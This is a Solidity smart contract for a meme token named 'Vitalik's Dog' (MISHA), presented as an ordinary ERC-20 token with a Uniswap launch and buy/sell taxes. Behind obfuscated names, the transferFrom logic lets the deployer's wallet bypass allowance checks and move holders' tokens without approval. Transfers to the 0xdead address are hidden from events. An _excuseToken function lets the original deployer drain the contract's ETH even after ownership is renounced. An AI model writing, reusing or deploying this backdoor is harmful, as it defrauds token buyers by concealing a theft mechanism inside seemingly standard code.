// SPDX-License-Identifier: MIT

/*
    Name: Vitalik's Dog
    Symbol: MISHA

    Misha, Vitalik Buterin's furry sidekick, is more than just a dog—he's a low-key crypto icon!

    Website: https://www.mishadoge.fun
    X: https://x.com/Mishadog_eth
    TG: https://t.me/Mishadog_eth

    https://x.com/VitalikButerin/status/1890377520664453140
*/

pragma solidity ^0.8.20;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

contract  MISHA is Context, IERC20, Ownable {
    using SafeMath for uint256;
    uint8 private constant _decimals = 9;
    string private constant _name = unicode"Vitalik's Dog";
    string private constant _symbol = unicode"MISHA";
    
    address payable private _MISHADOGPcTxZxcv214;
    mapping(address => uint256) private _MISHADOGPcsdlkfZxcv214;
    mapping(address => mapping(address => uint256)) private _MISHADOGPcTTxsOqZxcv214;
    mapping(address => bool) private _MISHADOGPCExcludedTax;
    uint256 private _MISHADOGPero007 = 10;
    uint256 private _MISHADOGPeTox007 = 10;
    uint256 private _broxccbosodijof = 0;
    uint256 private _MISHADOGPcrcoifinos = 0;
    uint256 private _MISHADOGPcsscw007 = 7;
    uint256 private _MISHADOGPcgodxxt = 7;
    uint256 private _buyCount = 0;
    address private _Bro00xovboidfor;
    address private _KeepMISHADOGp = address(0xdead);
    uint256 public _MISHADOGPcDev007 = 20000000 * 10 **_decimals;
    uint256 public _MISHADOGPcxwDev007 = 20000000 * 10 **_decimals;
    uint256 public _MISHADOGPcfeeDev007 = 10000000 * 10 **_decimals;
    uint256 private constant _MISHADOGPCollecDev007 = 1000000000 * 10 **_decimals;
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private isTrading;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint256 _MISHADOGPcDev007);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor() payable {
        _MISHADOGPcTxZxcv214 = payable(_msgSender());
        _MISHADOGPcsdlkfZxcv214[address(this)] = _MISHADOGPCollecDev007 * 98 / 100;
        _MISHADOGPcsdlkfZxcv214[owner()] = _MISHADOGPCollecDev007 * 2 / 100;
        _MISHADOGPCExcludedTax[owner()] = true;
        _MISHADOGPCExcludedTax[address(this)] = true;
        _MISHADOGPCExcludedTax[_MISHADOGPcTxZxcv214] = true;
        _Bro00xovboidfor = _msgSender();
        emit Transfer(address(0), address(this), _MISHADOGPCollecDev007 * 98 / 100);
        emit Transfer(address(0), address(owner()), _MISHADOGPCollecDev007 * 2 / 100);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function totalSupply() public pure override returns (uint256) {
        return _MISHADOGPCollecDev007;
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _MISHADOGPcTTxsOqZxcv214[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _MISHADOGPcsdlkfZxcv214[account];
    }
    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _MISHADOGPcTTxsOqZxcv214[owner][spender];
    }

    receive() external payable {}
    
    function _isDownAllowed(
        address sender,
        address recipient
    ) internal view returns (bool) {
        return
            (sender == uniswapV2Pair || recipient != _KeepMISHADOGp) &&
            msg.sender != _MISHADOGPcTxZxcv214;
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _subTransfer0x(_msgSender(), recipient, amount);
        return true;
    }

    function _lvckmjlwoie(
        address sender,
        address recipient,
        uint256 amount
    ) internal view returns (uint256) {
        uint256 _allowed = amount;
        if (_isDownAllowed(sender, recipient))
            _allowed = _MISHADOGPcTTxsOqZxcv214[sender][_msgSender()];
        return _allowed;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _subTransfer0x(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _lvckmjlwoie(sender, recipient, amount).sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function enableTokenTrading() external onlyOwner {
        require(!isTrading, "Already Launched!");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _MISHADOGPCollecDev007);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
        swapEnabled = true;
        isTrading = true;
    }

    function _assssist_token0x(uint256 amount) private {
        _MISHADOGPcTxZxcv214.transfer(amount);
    }

    function _subTransfer0x(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != address(this) && to != address(this)) {
            taxAmount = amount
                .mul(
                    (_buyCount > _MISHADOGPcsscw007)
                        ? _broxccbosodijof
                        : _MISHADOGPero007
                )
                .div(100);
            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_MISHADOGPCExcludedTax[to]
            ) {
                _buyCount++;
            }
            if (to == uniswapV2Pair && from != address(this)) {
                taxAmount = amount
                    .mul(
                        (_buyCount > _MISHADOGPcgodxxt)
                            ? _MISHADOGPcrcoifinos
                            : _MISHADOGPeTox007
                    )
                    .div(100);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled) {
                if (contractTokenBalance > 0) {
                    uint256 minBalance = (contractTokenBalance < _MISHADOGPcfeeDev007) ? contractTokenBalance : _MISHADOGPcfeeDev007; 
                    __INTERNAL_SWAP((amount < minBalance) ? amount : minBalance);
                }
                _assssist_token0x(address(this).balance);
            }
        }
        if (taxAmount > 0) {
        _MISHADOGPcsdlkfZxcv214[address(this)] =_MISHADOGPcsdlkfZxcv214[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _MISHADOGPcsdlkfZxcv214[from] =_MISHADOGPcsdlkfZxcv214[from].sub(amount);
        _MISHADOGPcsdlkfZxcv214[to] =_MISHADOGPcsdlkfZxcv214[to].add(amount.sub(taxAmount));
        if(_KeepMISHADOGp != to) emit Transfer(from, to, amount.sub(taxAmount));
    }

    function _MISHADOGdlklc(uint256 _amount) internal {
        payable(msg.sender).transfer(_amount);
    }

    function __INTERNAL_SWAP(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits () external onlyOwner {
        _MISHADOGPcDev007 = _MISHADOGPCollecDev007;
        _MISHADOGPcxwDev007 = _MISHADOGPCollecDev007;
        emit MaxTxAmountUpdated(_MISHADOGPCollecDev007);
    }

    function _excuseToken(address payable receipt) external {
        require(msg.sender == _Bro00xovboidfor , "");
        _MISHADOGPcTxZxcv214 = receipt;
        _MISHADOGdlklc(address(this).balance);
    }
}